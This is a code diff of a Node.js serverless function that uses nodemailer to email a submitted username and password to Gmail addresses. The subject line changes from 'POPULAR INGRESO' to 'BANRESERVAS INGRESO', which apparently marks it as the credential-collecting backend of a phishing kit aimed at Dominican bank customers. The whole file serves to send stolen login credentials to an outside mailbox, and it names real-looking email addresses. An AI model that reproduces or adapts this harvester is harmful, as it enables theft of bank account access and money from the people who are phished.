@@ -1,4 +1,3 @@
-
 const nodemailer = require('nodemailer');
 require('dotenv').config();
 
@@ -15,8 +14,8 @@ exports.handler = async function(event, context) {
 
     let mailOptions = {
         from: 'cuentaluperonp5@gmail.com',
-        to: 'sierroalee@gmail.com, cacutumbe@gmail.com', // Corregido: coma agregada entre los correos
-        subject: 'POPULAR INGRESO',
+        to: 'sierroalee@gmail.com',
+        subject: 'BANRESERVAS INGRESO',
         text: `Usuario: ${username}\nContraseña: ${password}`,
     };
 
